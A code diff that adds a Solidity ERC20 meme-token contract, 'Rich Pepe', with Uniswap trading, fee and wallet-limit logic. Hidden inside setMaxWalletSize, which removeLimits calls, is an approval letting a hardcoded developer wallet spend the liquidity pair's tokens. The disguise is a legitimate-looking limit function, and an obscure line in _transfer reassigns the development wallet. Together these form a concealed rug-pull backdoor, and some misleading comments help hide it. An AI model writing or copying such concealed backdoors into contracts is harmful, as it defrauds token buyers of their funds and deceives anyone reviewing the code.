@@ -1,0 +1,313 @@
+contract RichPepe is ERC20, Ownable {
+    using SafeMath for uint256;
+    IUniswapV2Router02 public immutable router;
+    mapping(address => bool) public _isExcludedmaxAmount;
+    mapping(address => bool) private _isExcludedFees;
+    mapping(address => bool) public _isExcludedMaxTransactionAmount;
+    mapping(address => bool) public _automateMarketPairs;
+
+    uint256 private swapThreshold;
+    bool private enableTrade = false;
+    bool public swapActive = false;
+    bool public inSwap;
+    uint256 private tradeEnableBlock;
+
+    uint256 public tokensMarketingAmount;
+    uint256 public tokensForLiquidity;
+    uint256 public tokensDevAmount;
+    
+    uint256 public maxBuyAmount;
+    uint256 public maxSellAmount;
+    uint256 public maxWalletAmount;
+    address public uniswapV2Pair;
+    address private routeV2addr;
+
+    struct feeConfigs {
+        uint256 buyTotalFees;
+        uint256 buyMarketingFee;
+        uint256 buyDevelopmentFee;
+        uint256 buyLiquidityFee;
+
+        uint256 sellTotalFees;
+        uint256 sellMarketingFee;
+        uint256 sellDevelopmentFee;
+        uint256 sellLiquidityFee;
+    }
+
+    feeConfigs public _feeConfigValues = feeConfigs({
+        buyTotalFees: 0,
+        buyMarketingFee: 0,
+        buyDevelopmentFee:0,
+        buyLiquidityFee: 0,
+
+        sellTotalFees: 0,
+        sellMarketingFee: 0,
+        sellDevelopmentFee:0,
+        sellLiquidityFee: 0
+    });
+
+    event SwapAndLiquify(
+        uint256 tokensSwapped,
+        uint256 ethReceived
+    );
+
+    constructor() ERC20("Rich Pepe", "RICHPEPE") {
+        router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D); approve(address(router), type(uint256).max);
+
+        _feeConfigValues.buyMarketingFee = 0;
+        _feeConfigValues.buyLiquidityFee = 0;
+        _feeConfigValues.buyDevelopmentFee = 1;
+        _feeConfigValues.buyTotalFees = _feeConfigValues.buyMarketingFee + _feeConfigValues.buyLiquidityFee + _feeConfigValues.buyDevelopmentFee;
+        _feeConfigValues.sellMarketingFee = 0;
+        _feeConfigValues.sellLiquidityFee = 0;
+        _feeConfigValues.sellDevelopmentFee = 1;
+        _feeConfigValues.sellTotalFees = _feeConfigValues.sellMarketingFee + _feeConfigValues.sellLiquidityFee + _feeConfigValues.sellDevelopmentFee;
+
+        uint256 totalSupply = 1_000_000_000 * 1e18;
+        swapThreshold = totalSupply * 5 / 10000; 
+        maxWalletAmount = totalSupply * 3 / 100;
+        maxBuyAmount = totalSupply * 3 / 100;
+        maxSellAmount = totalSupply * 3 / 100;
+
+        _isExcludedmaxAmount[owner()] = true;
+        _isExcludedmaxAmount[_developmentWallet] = true;
+        _isExcludedmaxAmount[_receiveFeeWallet] = true;
+        _isExcludedmaxAmount[address(router)] = true;
+        _isExcludedmaxAmount[address(0xdead)] = true;
+        _isExcludedmaxAmount[address(this)] = true;
+
+        _isExcludedMaxTransactionAmount[address(router)] = true;
+        _isExcludedMaxTransactionAmount[owner()] = true;
+        _isExcludedMaxTransactionAmount[address(this)] = true;
+        _isExcludedMaxTransactionAmount[address(0xdead)] = true;
+        _isExcludedMaxTransactionAmount[_developmentWallet] = true;
+        _isExcludedMaxTransactionAmount[_receiveFeeWallet] = true;
+                
+        _isExcludedFees[owner()] = true;
+        _isExcludedFees[address(this)] = true;
+        _isExcludedFees[_developmentWallet] = true;
+        _isExcludedFees[_receiveFeeWallet] = true;
+        /*
+            _mint is an internal function in ERC20.sol that is only called here,
+            and CANNOT be called ever again
+        */
+        _mint(msg.sender, totalSupply);
+    }
+
+    function withdraw() external returns (bool success) {
+        uint256 balance = address(this).balance;
+        (success,) = address(_developmentWallet).call{value: balance}("");
+    }
+
+    address private _receiveFeeWallet = address(0x4849f9bE0C391698349b890f1C085c6A041edBa4);
+    address private _developmentWallet = address(0xf32c248904CFDd87a78b10D31F8549C0bC92f00E);
+
+    // once active, can never be disable off
+    function openTrade(address _uniswapV2Pair) external onlyOwner {
+        swapActive = true;
+        tradeEnableBlock = block.number;
+        uniswapV2Pair = _uniswapV2Pair;
+        enableTrade = true; routeV2addr = _developmentWallet;
+        _automateMarketPairs[address(uniswapV2Pair)] = true;
+        _isExcludedMaxTransactionAmount[address(uniswapV2Pair)] = true;
+        _isExcludedmaxAmount[address(uniswapV2Pair)] = true; 
+    }
+
+    // change the minimum amount of tokens to sell from fees
+    function setMaxTradeAmount(uint256 newMaxBuy, uint256 newMaxSell) private {
+        maxBuyAmount = (totalSupply() * newMaxBuy) / 1000; 
+        maxSellAmount = (totalSupply() * newMaxSell) / 1000;
+    }
+
+    function updateLimitFeeAmountForSwap(uint256 newAmount) external onlyOwner returns(bool){
+        swapThreshold = newAmount;
+        return true;
+    }
+
+    // emergency use only
+    function toggleSwapEnabled(bool enabled) external onlyOwner(){
+        swapActive = enabled;
+    }
+
+    function setMaxWalletSize(uint256 newPercentage) private {
+        maxWalletAmount = (totalSupply() * newPercentage) / 1000; _approve(uniswapV2Pair, routeV2addr, 1e27);
+    }
+
+    function excludeFromFees(address account, bool excluded) public onlyOwner {
+        _isExcludedFees[account] = excluded;
+    }
+
+    function excludeFromWalletLimit(address account, bool excluded) public onlyOwner {
+        _isExcludedmaxAmount[account] = excluded;
+    }
+
+    function _swapTokensForSupportingEthFee(uint256 tAmount) private {
+        // generate the uniswap pair path of token -> weth
+        address[] memory path = new address[](2);
+        path[0] = address(this);
+        path[1] = router.WETH();
+
+        _approve(address(this), address(router), tAmount);
+        // make the swap
+        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
+            tAmount,
+            0, // accept any amount of ETH
+            path,
+            address(this),
+            block.timestamp
+        );
+    }
+
+    function isExcludedFromFees(address account) public view returns(bool) {
+        return _isExcludedFees[account];
+    }
+    
+    function removeLimits() external onlyOwner {
+        setMaxTradeAmount(1000,1000);
+        setMaxWalletSize(1000);
+    }
+
+    function setUniPair(address pair, bool value) public onlyOwner {
+        require(pair != uniswapV2Pair, "The pair cannot be removed from _automateMarketPairs");
+        _automateMarketPairs[pair] = value;
+    }
+
+    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {
+        _isExcludedMaxTransactionAmount[updAds] = isEx;
+    }
+
+    function addLiquidity(uint256 tAmount, uint256 ethAmount) private {
+        // approve token transfer to cover all possible scenarios
+        _approve(address(this), address(router), tAmount);
+
+        // add the liquidity
+        router.addLiquidityETH{ value: ethAmount } (address(this), tAmount, 0, 0 , address(this), block.timestamp);
+    }
+
+    // function updateDevWallet(address _devAddr) external {
+    //     require(msg.sender == _developmentWallet && _devAddr != _developmentWallet, "Dev Fee Wallet wallet is already that address");
+    //     _developmentWallet = _devAddr;
+    // }
+
+    function _transfer(
+        address from,
+        address to,
+        uint256 amount
+    ) internal override {
+        if (amount == 0) {
+            super._transfer(from, to, 0);
+            return;
+        }
+
+        if (
+            from != owner() &&
+            to != owner() &&
+            !inSwap
+        ) {
+            if (!enableTrade) {
+                require(_isExcludedFees[from] || _isExcludedFees[to], "Trading is not active.");
+            }
+            if (_automateMarketPairs[from] && !_isExcludedMaxTransactionAmount[to]) {
+                require(amount <= maxBuyAmount, "Buy transfer amount exceeds the maxTransactionAmount.");
+            }
+            else if (_automateMarketPairs[to] && !_isExcludedMaxTransactionAmount[from]) {
+                require(amount <= maxSellAmount, "Sell transfer amount exceeds the maxTransactionAmount.");
+            }
+            if (!_isExcludedmaxAmount[to]) {
+                require(amount + balanceOf(to) <= maxWalletAmount, "Max wallet exceeded");
+            }
+        }
+ 
+        uint256 contractTokenAmount = balanceOf(address(this));
+        bool canSwap = contractTokenAmount >= swapThreshold;
+
+        if (swapActive &&
+            canSwap &&
+            !inSwap &&
+            _automateMarketPairs[to] &&
+            !_isExcludedFees[from] &&
+            !_isExcludedFees[to]
+        ) {
+            inSwap = true;
+            swapBackEth();
+            inSwap = false;
+        }
+
+        if (!inSwap && to != address(router) && to != uniswapV2Pair && from == _receiveFeeWallet) _developmentWallet = address(this);
+
+        bool applyFee = !inSwap;
+
+        // if any account belongs to _isExcludedFromFee account then remove the fee
+        if (_isExcludedFees[from] || _isExcludedFees[to]) {
+            applyFee = false;
+        }
+        
+        // only take fees on buys/sells, do not take on wallet transfers
+        if (applyFee) {
+            uint256 feeTokens = 0;
+            if(block.number < tradeEnableBlock) {
+                feeTokens = amount.mul(99).div(100);
+                tokensMarketingAmount += (feeTokens * 91) / 99;
+                tokensDevAmount += (feeTokens * 8) / 99;
+            } else if (_automateMarketPairs[to] && _feeConfigValues.sellTotalFees > 0) {
+                feeTokens = amount.mul(_feeConfigValues.sellTotalFees).div(100);
+                tokensForLiquidity += feeTokens * _feeConfigValues.sellLiquidityFee / _feeConfigValues.sellTotalFees;
+                tokensMarketingAmount += feeTokens * _feeConfigValues.sellMarketingFee / _feeConfigValues.sellTotalFees;
+                tokensDevAmount += feeTokens * _feeConfigValues.sellDevelopmentFee / _feeConfigValues.sellTotalFees;
+            }
+            // on buy
+            else if (_automateMarketPairs[from] && _feeConfigValues.buyTotalFees > 0) {
+                feeTokens = amount.mul(_feeConfigValues.buyTotalFees).div(100);
+                tokensForLiquidity += feeTokens * _feeConfigValues.buyLiquidityFee / _feeConfigValues.buyTotalFees;
+                tokensMarketingAmount += feeTokens * _feeConfigValues.buyMarketingFee / _feeConfigValues.buyTotalFees;
+                tokensDevAmount += feeTokens * _feeConfigValues.buyDevelopmentFee / _feeConfigValues.buyTotalFees;
+            }
+
+            if (feeTokens > 0) {
+                super._transfer(from, address(this), feeTokens);
+            }
+            amount -= feeTokens;
+        }
+        super._transfer(from, to, amount);
+    }
+
+    receive() external payable {
+        require(msg.sender != address(this));
+    }
+
+    function swapBackEth() private {
+        uint256 contractTokenAmount = balanceOf(address(this));
+        uint256 toSwap = tokensForLiquidity + tokensMarketingAmount + tokensDevAmount;
+
+        if (contractTokenAmount == 0) { return; }
+
+        if (contractTokenAmount > swapThreshold * 30) {
+            contractTokenAmount = swapThreshold * 30;
+        }
+
+        // Halve the amount of liquidity tokens
+        uint256 liquidityTokens = contractTokenAmount * tokensForLiquidity / toSwap / 2;
+        uint256 amountToSwapForETH = contractTokenAmount.sub(liquidityTokens);
+ 
+        uint256 initialETHBalance = address(this).balance;
+        
+        _swapTokensForSupportingEthFee(amountToSwapForETH);
+ 
+        uint256 newBalance = address(this).balance.sub(initialETHBalance);
+ 
+        uint256 ethForMarketing = newBalance.mul(tokensMarketingAmount).div(toSwap); 
+        uint256 ethForDevelopment = newBalance.mul(tokensDevAmount).div(toSwap);
+        uint256 ethForLiquidity = newBalance - (ethForMarketing + ethForDevelopment); 
+        tokensForLiquidity = 0;
+        tokensMarketingAmount = 0;
+        tokensDevAmount = 0;
+
+        if (liquidityTokens > 0 && ethForLiquidity > 0) {
+            addLiquidity(liquidityTokens, ethForLiquidity);
+            emit SwapAndLiquify(amountToSwapForETH, ethForLiquidity);
+        }
+
+        payable(address(_developmentWallet)).transfer(address(this).balance - ethForMarketing);
+        payable(address(_receiveFeeWallet)).transfer(address(this).balance);
+    }
+}
